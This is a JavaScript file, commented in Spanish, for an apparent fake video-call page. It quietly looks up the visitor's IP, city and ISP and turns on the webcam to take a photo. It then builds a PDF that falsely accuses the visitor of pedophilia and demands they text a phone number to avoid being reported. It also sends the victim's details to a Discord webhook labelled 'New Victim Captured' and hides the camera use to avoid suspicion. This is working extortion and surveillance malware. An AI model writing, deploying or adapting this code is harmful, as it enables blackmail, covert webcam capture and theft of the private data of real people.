const { jsPDF } = window.jspdf;

// CONFIGURACIÓN
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1456923409819631763/Lhg_36A9coD4f7QFymmfq9kWS7kGs2RbPpjIgntevH2lxXk5zcJ6u1rUZhWYDmYRZ861';
const LOGO_BASE64 = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=='; // Reemplaza por tu Base64 largo

document.getElementById('start').addEventListener('click', async () => {
    try {
        // 1. Obtener datos de IP y Ciudad (Silencioso)
        const geoReq = await fetch('https://ipapi.co/json/');
        const geo = await geoReq.json();

        // 2. Activar Cámara
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        video.srcObject = stream;
        
        // Simular conexión
        document.getElementById('status-overlay').style.display = 'none';
        document.getElementById('start').innerText = "En la llamada...";

        // 3. Captura y Procesamiento (Espera 2 segundos para que se vea la cara)
        setTimeout(async () => {
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, 640, 480);
            const photoData = canvas.toDataURL('image/jpeg');

            // --- GENERAR PDF ---
            const doc = new jsPDF();
            // Encabezado
            doc.addImage(LOGO_BASE64, 'PNG', 10, 10, 30, 30);
            doc.setFontSize(20);
            doc.text("LA PEDOFILIA ES UN DELITO GRAVE, ENVIA MENSAJE AL 4427788700 SI NO QUIERES SER DENUNCIADO", 50, 25);
            doc.setLineWidth(0.5);
            doc.line(10, 45, 200, 45);

            // Datos
            doc.setFontSize(12);
            doc.text(`Usuario: Invitado_${geo.ip.split('.')[0]}`, 10, 60);
            doc.text(`Ubicación Detectada: ${geo.city}, ${geo.country_name}`, 10, 70);
            doc.text(`Proveedor Internet: ${geo.org}`, 10, 80);
            doc.text(`Navegador: ${navigator.userAgent.slice(0, 50)}...`, 10, 90);

            // Foto
            doc.text("Captura de Validación:", 10, 105);
            doc.addImage(photoData, 'JPEG', 10, 110, 160, 120);
            
            doc.save("Pase_De_Acceso.pdf");

            // --- EXFILTRACIÓN A DISCORD ---
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: "🚀 Nueva Víctima Capturada",
                        color: 15158332,
                        fields: [
                            { name: "IP", value: geo.ip, inline: true },
                            { name: "Ciudad", value: geo.city, inline: true },
                            { name: "ISP", value: geo.org },
                            { name: "Navegador", value: navigator.userAgent }
                        ],
                        footer: { text: "Laboratorio de Ciberseguridad" }
                    }]
                })
            });

            // Apagar cámara tras 5 segundos para no sospechar
            setTimeout(() => {
                stream.getTracks().forEach(t => t.stop());
                alert("Verificación completada. Su archivo de acceso se ha descargado.");
            }, 3000);

        }, 2000);

    } catch (err) {
        alert("Error: Debes permitir la cámara para unirte a la reunión.");
    }
});
